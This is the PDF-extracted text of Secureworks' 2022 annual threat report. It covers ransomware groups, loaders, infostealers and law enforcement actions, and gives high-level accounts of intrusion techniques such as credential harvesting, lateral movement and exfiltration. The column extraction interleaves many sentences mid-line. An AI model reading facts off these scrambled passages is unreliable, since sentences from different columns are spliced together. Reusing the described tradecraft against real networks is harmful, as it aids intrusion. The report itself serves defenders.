2022
State of 
the Threat

A Y E A R I N R E V I E W

Table of 
Contents

03

05

07

17

31
36

56

64

65

Letter From Our Chief Threat Intelligence Officer (CTIO)

Executive Summary and Key Findings

Ransomware Remains the Primary Strategic Threat

Ransomware Enablers: Loaders and Infostealers

Exploitation of Remote Services is Now the Most Common Access Vector

Hostile Government\-Sponsored Actor Activity Shows a Regional Focus

Defense Evasion Offers Its Own Detection Opportunities

Conclusion

The Secureworks View of the Threat

2022 State of the Threat: A Year in Review

2

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

01
A Letter From Our Chief 
Threat Intelligence Officer

The last twelve months have featured a series of headline\-grabbing 

the Secureworks Incident Response team, this combines to create 

cybersecurity events. In December 2021, disclosure of a vulnerability in 

one of the most comprehensive views of the threat landscape in the 

the popular Log4j software caused global panic as IT teams scrambled 

industry.

to find and patch vulnerable systems. In early 2022, the Russian 

military build\-up on the Ukrainian border and subsequent invasion 

The purpose of this report is to share our view on how the threat 

raised the specter of disruptive cyberattacks that might spill beyond 

landscape has evolved over the last twelve months, with a clear 

Ukraine’s borders, as happened with NotPetya in 2017\. And in mid\-April, 

focus on our first\-hand observations of threat actor tooling and 

Conti ransomware knocked offline several Costa Rican government 

behaviors. The report reviews changes in the ransomware landscape, 

institutions, severely disrupting their ability to effectively deliver public 

and in the behavior of threat actors enabling ransomware groups 

services.

with malware like loaders and stealers. It surveys significant activity 

by major government\-sponsored threat groups. And it examines how 

Our job is to dig beneath these headlines to understand the nature of 

threat actors move swiftly to exploit new vulnerabilities, and how they 

the threat and mitigate the risk to our customers. We do that through 

combine sophisticated with more basic techniques to evade detection 

Defense Evasion Offers Its 
Own Detection Opportunities

up\-to\-date threat intelligence that is fueled by data\-driven detection 

by defenders once inside the network. The report concludes by 

and analysis. The Secureworks® Counter Threat Unit™ (CTU) continues 

examining how Taegis forms the backbone of this visibility.

Conclusion

The Secureworks 
View of the Threat

to analyze trillions of security events every week, gathered from its 

Taegis™ XDR platform. Together with the data processed through the 

Across Secureworks, different teams work together to protect our 

Taegis Vulnerability Detection and Response (VDR) solution, proactive 

customers. Our CTU™ research teams invest countless hours in 

research, and insights gathered through engagements carried out by 

developing an understanding of the threat and how it might manifest, 

01

02

03

04

05

06
06

07

07

08

08
09

2022 State of the Threat: A Year in Review

3

and then in building ways to detect that threat which can be applied 

Human expertise works with the technical excellence of Taegis XDR 

to our Taegis XDR and VDR platforms. Our Security Operations teams 

and Taegis VDR to keep Secureworks customers safe on their security 

act as the watchful guardian of our customer networks, monitoring 

journey. We hope the insights embodied in this report help you to 

constantly for any changes that might indicate malicious activity. Our 

protect your organization.

Incident Response team stands ready to support customers through 

the provision of proactive training, to help them prepare; and through 

reactive support to investigate, contain and remediate where breaches 

do occur. And our Secureworks Adversary Group emulates adversary 

behaviors to help customers test how their control frameworks perform 

in realistic, intelligence\-driven scenarios.

Barry Hensley

Chief Threat Intelligence Officer
Secureworks

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

2022 State of the Threat: A Year in Review

4

02
Executive 
Summary and 
Key Findings

Over the past year, cybersecurity events have been heavily influenced 

by escalating tensions in eastern Europe and the Middle East, a steady 

stream of critical vulnerabilities forcing organizations to scramble to 

patch their systems, and public leaks exposing the inner workings of 

organized cybercriminal ransomware gangs. 

The role of the Secureworks Counter Threat Unit is to maintain an 

understanding of these diverse threats and apply that understanding 

to inform and protect customers. Between the end of June 2021 

and June 2022, based on insights from customer telemetry, incident 

response, underground monitoring, proactive threat research and 

intelligence relationships, CTU researchers observed the following 

high\-level trends across the threat landscape:

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

2022 State of the Threat: A Year in Review

5

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

01

Ransomware remains the primary threat facing 

organizations. Detection strategies should focus on 

04

Based on learnings1 from Secureworks incident response 

engagements, exploitation of remote services has 

identifying ransomware precursors during the 'detection 

replaced credential\-based access as the most 

window' between initial access and ransomware 

common initial access vector, stressing the need for 

deployment. The median detection window in 2022 is four 

effective vulnerability management and prioritization.

and a half days.

Ransomware Enablers: 
Loaders and Infostealers

02

There has been flux in the loader landscape, with 

the disappearance of some established loaders and 

05

Nation\-state activity has been heavily focused on 

regional considerations. Notable examples include 

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

the emergence of new ones. As the malware that 

Russia's cyber operations in support of the invasion of 

loads second\-stage payloads like ransomware, loaders 

Ukraine, disruptive reciprocal attacks likely conducted by 

form a key component of the ransomware ecosystem. 

Iranian and Israeli proxy actors, and China's continued 

There is evidence of close collaboration between 

focus on the South China Sea and East Asia. 

the groups operating these loaders, and signs of a 

possible shift towards lightweight, disposable loaders 

in place of the complex botnets that up until now have 

provided this loader capability. 

03

Infostealers provide the means to quickly and easily obtain 

credentials that can be used for initial access, making them 

a major enabler of ransomware operations. On a single day 

in June 2022, CTU researchers observed over two million 

credentials obtained by infostealers available for sale on 

just one underground marketplace. Innovative distribution 

methods for infostealers have included cloned websites and 

trojanized installers for messaging apps such as Signal. 

06

Defense evasion is a feature of many network 

intrusions. However, the techniques used are 

generally not very sophisticated, because they 

do not need to be. This provides additional detection 

opportunities.

2022 State of the Threat: A Year in Review

6

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

03
Ransomware Remains the 
Primary Strategic Threat

The composition of the global ransomware landscape and the number 

Analysis of Secureworks incident response engagements for May and 

of victims continue to fluctuate. Yet overall, despite a series of high\-

June 2022 appears to suggest that the rate at which new, successful 

profile law enforcement interventions and public leaks, ransomware 

ransomware attacks are happening is reducing, although it is too early 

operators have maintained high levels of activity. 

to say if this is trend will continue.

MAY 2021

DarkSide afﬁliate ransomware 
attacks Colonial Pipeline

JUNE 2021

U.S. Department of Justice (DOJ) 
recovers $2\.3 million USD of the 
Colonial Pipeline ransom

AUGUST 2021

DarkSide group 
rebrands as 
BlackMatter 
following 
post Colonial 
Pipeline hiatus

OCTOBER 2021

APRIL 2022

REvil shuts down following law 
enforcement operation

Law enforcement takedowns of 
popular underground platforms Raid 
Forums and Hydra Market

FEBRUARY 2022

Conti Leaks provide insight 
into inner workings of the 
group

JUNE 2022

Conti operation 
shut down

Image Placeholder

MARCH 2022

JULY 2021

AUGUST 2021

TrickBot 
abandoned

Kaseya ransomware 
attack by REvil afﬁliate

Conti playbook leaks 
describe operating 
methodology of Conti 
afﬁliate

APRIL 2022

REvil brieﬂy 
returns

NOVEMBER 2021

Emotet resurrected after January 
2021 law enforcement takedown

JUNE 2021

DOJ unseals indictment of 
Alle ‘Max’ Witte, a developer 
of TrickBot malware, a key 
ransomware enabler

Figure 1\. Key developments in the ransomware landscape, June 2021 \- June 2022\. (Source: Secureworks)

2022 State of the Threat: A Year in Review

7

The demise of GOLD ULRICK's2 Conti ransomware\-as\-a\-service 

services after the event. And some ransomware gangs may have 

operation could account for some of this reduction, but not all. Other 

decided that hitting higher numbers of smaller organizations is less 

factors influencing the rate of attacks might include the disruptive 

likely to provoke a strong law enforcement response than hitting large, 

effect on ransomware gangs of the war in Ukraine, economic sanctions 

global brands. Unfortunately, smaller organizations may also be less 

designed to create friction for ransomware operators trying to cash 

familiar with the mechanism for reporting to and accessing support 

in on their attacks, and the volatility of the digital currencies through 

from law enforcement and specialist security vendors, meaning that 

which ransomware gangs realize their profits.

the true impact of ransomware will continue to be under reported and 

victims will not receive the support they need.

However, there could be something else going on. There is no 

corresponding trend of a year\-on\-year reduction in the number of 

Regardless of the overall trend, for any individual organization 

organizations listed on public ransomware leak sites (figure 2\). And 

ransomware remains a major threat and one that feeds on gaps in 

CTU researchers are investigating whether there is a general trend 

security control frameworks. Examination of Secureworks threat 

in the size of those victim organizations reducing over time. Smaller 

research and incident response data provides insights into the tactics 

organizations are likely to be less well resourced, making them a softer 

of individual threat groups and highlights lessons that can help 

target and one that is less likely to bring in specialist incident response 

organizations better protect themselves.

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Figure 2\. Publicly listed ransomware victims by month. (Source: Secureworks)

2022 State of the Threat: A Year in Review

8

050100150200250300350400Jan\-21Feb\-21Mar\-21Apr\-21May\-21Jun\-21Jul\-21Aug\-21Sep\-21Oct\-21Nov\-21Dec\-21Jan\-22Feb\-22Mar\-22Apr\-22May\-22Jun\-2201

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

The Window of Opportunity 
for Network Defenders

During any network intrusion, there is a window of opportunity for 

defenders. This happens between the point of initial access and the 

encryption of data when the threat actors are consolidating their 

access prior to achieving their ultimate objective. So far in 2022, the 

median time between initial access and ransomware detonation in 

intrusions investigated by Secureworks incident responders is 4\.5 days, 

compared to 5 days in 2021\. The mean dwell time in 2021 was 22 days 

but so far in 2022 is down at 11 days, reflecting that there have been 

fewer 'outliers' compared to 2021, i.e. intrusions where threat actors 

spent weeks or months in an environment before deploying their 

ransomware. 

4\.5 Days

Average (median) dwell time 
for ransomware actors

Of course, this dwell time can vary significantly. In early 2022, an 

organization exposed a computer in an operational technology (OT) 

environment to the internet with the firewall disabled to troubleshoot 

network connectivity issues and download patches. Within five hours 

the computer had been compromised and within a further hour, 

the threat actors had disabled Windows Defender and deployed 

Phobos ransomware. While only a small number of devices 

were affected and the network was isolated from the rest of the 

organization, the intrusion was sufficient to temporarily disrupt 

business operations at that location.

In contrast, analysis of a Lorenz ransomware attack in September 

2021 showed that the threat actors, tracked by CTU researchers as 

GOLD LOUNGE3, had access for almost a year. The initial intrusion 

likely occurred in October 2020, with GOLD LOUNGE periodically 

re\-accessing the compromised environment to run reconnaissance 

commands, occasionally rotating the remote IP address they 

connected in from. They made extensive use of SMBExec to move 

laterally to other hosts within the environment. In September 2021, 

GOLD LOUNGE staged Lorenz ransomware in the SYSVOL directory of 

several compromised domain controllers and created scheduled tasks 

with random names on target systems to download and execute the 

ransomware. They then deleted volume shadow copies and cleared 

the security event log. One hypothesis to explain this lengthy delay is 

that GOLD LOUNGE purchased access from an initial access broker 

(IAB) long after the IAB first obtained it. 

Regardless of the length of the detection window, network defenders 

can and should exploit it. On numerous occasions, Taegis XDR 

countermeasures have alerted customers to ransomware precursors 

in their environment, allowing them to isolate impacted hosts, block 

the command\-and\-control infrastructure, and reset compromised 

credentials before the threat actors can capitalize on the access. 

The difference in terms of time to recovery, total costs incurred and 

business disruption, compared to organizations who did not spot the 

threat in time, can be huge.

2022 State of the Threat: A Year in Review

9

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Prevent Where You Can, 
and Detect What Can’t 
Be Prevented 

Undoubtedly, the best way to protect your organization 

against ransomware deployment is to prevent or detect 

the initial breach.

3%

Commodity 
malware 
infection

2%

Drive by
download

2%

Phishing

2%

Network
misconﬁguration

This requires a tight focus on good, basic security hygiene.

• Ensure that all external and key internal systems are 

protected with multi\-factor authentication (see chapter 
5 for tips on avoiding pitfalls).

• 

Implement a timely vulnerability detection and patching 
program (see more about vulnerabilities in chapter 3\).

• For those situations where prevention fails, visibility of 
the environment is critical. You can't protect what you 
can't see. Trying to develop that visibility after you've 
identified a breach is too late. 

• Deploy a comprehensive monitoring and detection 

solution on all endpoints, network, and cloud (see the 
appendix for important monitoring considerations).

39%

Credentials

52%

Exploitation of 
remote services

Figure 3\. Initial access vectors for ransomware incidents, June 2021 \- June 
2022\. (Source: Secureworks)

2022 State of the Threat: A Year in Review

10

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

New Players, Old Players

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

During the reporting period new ransomware groups appeared, many 

only briefly or with little impact, while others apparently disappeared. 

In some cases, this fluctuation represented a rebrand by established 

ransomware groups, possibly to minimize law enforcement and media 

scrutiny, and in some cases to disguise their identity in response to 

financial sanctions. In others, it may have been a result of the shifting 

allegiance of affiliates in the hunt for more victims and greater 

revenues.

Jul. 2021

Aug. 2021

Sept. 2021

Oct. 2021

Nov. 2021

Dec. 2021

Jan. 2022

Feb. 2022

Mar. 2022

Apr. 2022

May 2022

Jun. 2022

TOTAL

LockBit

Conti

BlackCat/
ALPHV

Hive

AvosLocker

Vice Society

Grief

BlackByte

Black Basta

Lorenz

REvil

56

23

15

8

3

11

4

11

76

27

19

5

3

4

2

2

83

28

2

8

6

7

7

3

86

53

8

10

4

18

12

3

91

96

7

15

2

10

13

54

36

15

16

9

4

11

6

3

45

11

12

7

4

8

8

1

76

34

24

9

3

9

98

73

21

21

3

10

5

4

94

43

32

5

5

17

4

11

6

3

71

12

15

15

10

5

22

7

2

45

15

5

11

12

2

18

1

875

436

134

129

81

79

69

65

51

28

22

Figure 4\. Major ransomware schemes active during the period, showing number of victims per month. (Source: Secureworks)

2022 State of the Threat: A Year in Review

11

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Law Enforcement Actions

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Over the reporting period, there have been several significant law 

enforcement actions or sanctions aimed at disrupting ransomware 

operators or their access to supporting services such as 

cryptocurrency money laundering.

• U.S. Treasury OFAC sanctions4 in December 2019 

targeting GOLD DRAKE5, also known as Evil Corp, have 

led to the threat group repeatedly changing ransomware 

variants to complicate attribution of their attacks back to 

them, so that victims do not find themselves prohibited 

from paying the ransom. During the reporting period, they 

switched between several ransomware families including 

WastedLocker, Macaw, and potentially also LockBit6\.

• 

In April 2022, OFAC sanctioned Hydra Market (Hydra), 

the world's largest darknet market. OFAC identified that 

approximately $8 million in ransomware proceeds had been 

laundered through it. It also sanctioned Garantex, a virtual 

currency exchange registered in Estonia thought to have 

processed transactions worth nearly $6 million from GOLD 

ULRICK's Conti operation. 

• 

In May, OFAC sanctioned virtual currency mixer7 Blender.

io (Blender), which had allegedly obscured transactions for 

Russian cybercrime groups including GOLD ULRICK and 

GOLD BLACKBURN8, and for North Korean threat actors.

• Also in May9, the U.S. State Department offered a financial 
reward for information leading to the arrest of senior 

members of the Conti ransomware operator.

Legal action aimed at ransomware actors over the period included the 

Department of Justice's partial seizure from a Darkside affiliate of the 

ransom paid by Colonial Pipeline; the multi\-country operation that took 

control of REvil servers in October, forcing them offline, and operator 

GOLD SOUTHFIELD into hibernation; and the arrest in Russia of 

individuals associated with the REvil ransomware\-as\-a\-service (RaaS) 

operation in January.

Action aimed at supporting services included the U.S. Department 

of Justice unveiling10 an indictment filed in 2020 against Latvian 

national Alla Witte for her role as a malware developer in the operation 

of TrickBot. Chats contained in the Conti Leaks11 showed GOLD 

BLACKBURN allocating funds for finding a lawyer to represent Witte. 

RaidForums, used to sell databases containing billions of card and 

banking details, as well as login credentials, also closed in April, as the 

result of Operation TOURNIQUET12, a complex law enforcement effort 

coordinated by Europol. The site was closed, its infrastructure seized, 

and its administrator and his accomplices arrested.

The long\-term impact of increased law enforcement activity against 

ransomware operators remains difficult to judge. The process of 

having to re\-brand undoubtedly introduces cost for ransomware 

actors, including potentially through the loss of affiliates to other RaaS 

schemes. And many victims do hesitate to pay ransoms to sanctioned 

groups. However, ransomware groups have shown an ability to 

recover from disruptive interventions and identify alternative means 

of sustaining their operations. The lack of cooperation from countries 

where core members of the prominent ransomware groups reside 

continues to hamper disruption efforts.

2022 State of the Threat: A Year in Review

12

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

GOLD MYSTIC's13 LockBit RaaS was the most active name\-and\-

of the group were still in custody20\. This could indicate that the 

shame operation, listing 875 victims on its public leak site by the end 

individuals had been quietly released prior to that point, or perhaps the 

of June 2022\. Secureworks incident responders have responded to 

arrests were of fringe members and had no real impact on the group's 

LockBit intrusions against organizations in the technology, business 

operational capabilities. The timing also coincides with the breakdown 

services, media, finance, and legal sectors across the Middle East, 

of cooperation between Russia and the U.S. on cybercrime.

Europe, the U.S., Asia, and Australia. GOLD MYSTIC appears to have 

been highly effective at recruiting affiliates from other RaaS schemes, 

and in at least one case CTU researchers were able to link a July 2021 

LockBit incident to a June 2021 REvil incident, assessing with moderate 

confidence that the same affiliate was responsible for both incidents 

as well as for an earlier January 2021 incident reported14 by Ahnlab.

The (Non) Return of REvil

On April 19, 2022, CTU researchers observed two dormant Tor sites 

associated with REvil become active again. Both sites were redirecting 

to a new Tor site that appeared to be a revamp of the original REvil 

The Perils of Timestamps— 
Can They Be Trusted? 

Analysis of REvil's resurgence relied in part on analysis of 

compilation timestamps. Compilation timestamps show when 

a file, in this case a REvil ransomware binary, was created and 

can be useful for building a timeline of threat actor activity. 

But they can, and often are, falsified by threat actors. Threat 

intelligence analysts need to be careful in relying on them. 

leak site. The new leak site retained the original list of victims, as well 

CTU researchers have been tracking GOLD SOUTHFIELD 

since 2019 and have processed thousands of REvil samples. 

Whenever a new version of REvil has appeared, the 

compilation timestamp for the executable aligns with what is 

expected of a new release. Compilation timestamps also align 

for samples across multiple different campaigns. Therefore, 

while compilation timestamps should generally be treated 

cautiously, in this case they are a useful data point.

as three new victims. This was odd, given that GOLD SOUTHFIELD15 

initially went offline shortly after the Kaseya attack16 that occurred 

over Independence Day weekend in July 2021 and then was forced 

offline permanently by a collaborative law enforcement17 effort in 

October. 

Naturally, the use of the same Tor infrastructure and REvil source 

code caused speculation about whether REvil was back, despite the 

reported18 arrest of members of the group by the Russian FSB in 

January 2022\. But in spite of these early signs of a resurgence, REvil is 

yet to reach its former level of activity. 

Intriguingly, CTU researchers identified19 REvil samples compiled in 

March at a time when, according to the Russian authorities, members 

2022 State of the Threat: A Year in Review

13

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

ALPHV Works Cross\-Platform

Executive Summary 
and Key Findings

ransomware that can be deployed across multiple operating systems. 

stolen credentials, the threat actors logged into domain administrator 

One example is GOLD BLAZER's21 ALPHV ransomware, also known as 

accounts and used the access to stage, compress, and exfiltrate files.

It is increasingly common for ransomware groups to compile 

reconnaissance and used Mimikatz to harvest credentials. Using these 

Ransomware Remains the 
Primary Strategic Threat

multiple ALPHV intrusions worked by Secureworks incident responders, 

ALPHV is written in Rust, making the ransomware scalable across 

the operators move from initial infection to data exfiltration within a few 

Windows and Linux operating systems without needing to maintain 

BlackCat, which emerged in December 2021\. Based on insights from 

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

days, to deploying ransomware within approximately one week. In one 

distinct codebases. Its configuration file (figure 5\) includes options to 

incident, GOLD BLAZER or one of its affiliates abused a single\-factor 

terminate ESXi 'vm' and 'vm snapshot' files. The hybrid approach of 

authentication Virtual Private Network (VPN) for the initial infection 

listing Linux and Windows file extensions is unusual.

vector. After compromising the device, the threat actors conducted 

Figure 5\. ALPHV configuration file. (Source: Secureworks)

2022 State of the Threat: A Year in Review

14

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Hive Proves Effective 
at Attracting Affiliates

Desktop Protocol (RDP) servers using compromised credentials. 

After conducting reconnaissance to enumerate domains and harvest 

credentials using tools like PCHunter64, SharpView and Mimikatz, the 

group moves laterally using RDP with stolen credentials. The SystemBC 

Hive is another ransomware that has featured heavily in incident 

proxy tool is used to disguise network traffic and Cobalt Strike Beacon 

response engagements worked by Secureworks during the period. The 

is installed across number hosts for command and control. The group 

operators of the Hive RaaS, GOLD HAWTHORNE22, have been active 

explores directories and views specific files before using FileZilla for 

since at least June 2021\.

data exfiltration and then ultimately deploying the Hive ransomware via 

Group Policy Object or Scheduled Task (figure 6\).

Since April 2022, CTU researchers have attributed a series of Hive\-

related intrusions to a single affiliate, GOLD MATADOR23\. GOLD 

MATADOR gains access to networks through VPN or Remote 

Figure 6\. Scheduled Task (veeamupdate) used by GOLD MATADOR to detonate Hive ransomware. (Source: Secureworks)

2022 State of the Threat: A Year in Review

15

Experimentation With 
Hack and Leak Continues 

The Secureworks 2021 State of the Threat report highlighted hack and 

leak incidents (where no ransomware was deployed) as a potential 

shift away from the traditional ransomware\-based extortion model. It 

remains unclear whether this approach provides a viable long\-term 

GOLD TOMAHAWK intrusions typically start with access through 

internet\-facing VPN endpoints, likely leveraging vulnerabilities or weak 

or stolen credentials. Once inside the network, GOLD TOMAHAWK 

does not deploy custom tooling, relying instead on off\-the\-shelf 

tools and applications, often native to the victim system, to meet its 

objectives. The threat group has been observed to use RDP for lateral 

movement, AnyDesk for remote access, 7\-Zip to compress data for 

extraction, and the Mega and QuickPacket file\-upload services for 

business model, but some groups such as GOLD TOMAHAWK24 

continue to practice it. Also known as Karakurt Team or Karakurt Lair, 

exfiltration. 

GOLD TOMAHAWK has been active since mid\-2021\.

Another hack and leak actor that emerged during the period is 

the GOLD RAINFOREST25 (Lapsus$) threat group, who claimed 

responsibility for several high\-profile breaches including against 

Microsoft, Samsung and Nvidia. Identified members of GOLD 

RAINFOREST don’t match the typical stereotype of Russian\-organized 

cybercriminals. But the success they were able to achieve in a 

short space of time is a cautionary tale about the importance 

of understanding how easy it can be for threat actors with a 

moderate level of capability and, critically, a means of accessing an 

organization's network to carry out attacks.

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Figure 7\. GOLD TOMAHAWK (Karakurt) leak site screenshot. 
(Source: Secureworks)

2022 State of the Threat: A Year in Review

16

04
Ransomware Enablers: 
Loaders and Infostealers

Malware distribution forms a key component of the broad infrastructure 

that both supports and fuels the ransomware ecosystem. Delivery 

techniques continue to evolve, and the relationship between 

established ransomware operators and malware distribution operators 

remains a close one.

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

2022 State of the Threat: A Year in Review

17

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Now You See Them, 
Now You Don't

Between July 2021 and June 2022, two big names in the loader 

landscape disappeared and two returned, demonstrating that writing off 

botnets and their associated malware, even after periods of inactivity, 

Ransomware Remains the 
Primary Strategic Threat

can be premature.

Emotet returned in November 2021, following its January 2021 

takedown by international law enforcement agencies. During this 

downtime, its developers, tracked as the GOLD CRESTWOOD26 

threat group, had made some changes. The Emotet code appeared 

enhanced and streamlined, with more modern cryptography, different 

communications protocols, a switch to 64\-bit architecture, more 

customizable execution options, and new command and control 

(C2\) infrastructure. CTU researchers also observed evidence of 

GOLD CRESTWOOD experimenting with re\-implementing deprecated 

functionality such as modules to steal credit card information from 

web browsers and self\-propagation27 using SMB and a list of 

hardcoded credentials. 

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Conti operator GOLD ULRICK was likely instrumental28 in Emotet’s 

return, and the Conti Leaks provided evidence of the close relationship 

between the ransomware group and GOLD CRESTWOOD. Emotet 

reappeared as a DLL download from TrickBot, suggesting that GOLD 

CRESTWOOD aimed to rebuild the Emotet botnet by using long\-time 

collaborator GOLD BLACKBURN's TrickBot infrastructure. Emotet was 

also distributed through malicious Windows App Installer packages 

disguised as Adobe PDF software, much like GOLD BLACKBURN's 

BazarBackdoor malware. In January 2022, CTU researchers observed 

Emotet executing reconnaissance commands (see figure 8\) replacing 

functionality that was previously provided by intermediate payloads 

Qakbot and TrickBot. 

Figure 8\. Emotet executing reconnaissance commands and credential\-theft 
tools. (Source: Secureworks)

2022 State of the Threat: A Year in Review

18

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

In March, Emotet resumed dropping Qakbot, using the 'azd' Qakbot 

The TrickBot botnet stopped responding to infected systems on 

campaign ID which likely refers to a GOLD LAGOON29 affiliate. 

March 1, 2022, after a progressive decrease since mid\-2021 in the 

Qakbot had itself taken a two\-month hiatus in 2021, reappearing on 

tempo of updates to TrickBot\-infected hosts via its C2 infrastructure. 

September 9, 2021\. During the break, Qakbot's backend infrastructure 

There were no signs of it returning to life by August, and it seems likely 

was for the first time switched off rather than left to idle, leading the 

that the group intends to permanently abandon it.

security community to question if the hiatus could be permanent. 

Since its return, Qakbot has resumed its role as a major player in the 

loader landscape. 

On October 18, CTU researchers observed Qakbot deploying a new 

plugin containing the legitimate Atera remote management and 

monitoring (RMM) software to all infected devices (figure 9\).

Figure 9\. msiexec.exe launching the Windows installer file that installs the Atera 
RMM software. (Source: Secureworks)

OCTOBER 19, 2021

DECEMBER 20, 2021

FEBRUARY 20, 2022 

MARCH 1, 2022 

Last C2 server update to 
botnet segment 
2000000

Last plugin
update

Aspects of C2
infrastructure start
going ofﬂine

C2 infrastructure 
completely disabled

JULY 31, 2021

Last C2 server update to 
botnet segment 
1000000

DECEMBER 6, 2021

DECEMBER 29, 2021

FEBRUARY 27, 2022

Web injects 
disabled

Last observed 
TrickBot spam 
campaign

Conti data 
leaks begin

Figure 10\. Timeline of TrickBot activity from July 2021 through March 2022\. (Source: Secureworks)

2022 State of the Threat: A Year in Review

19

• 

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
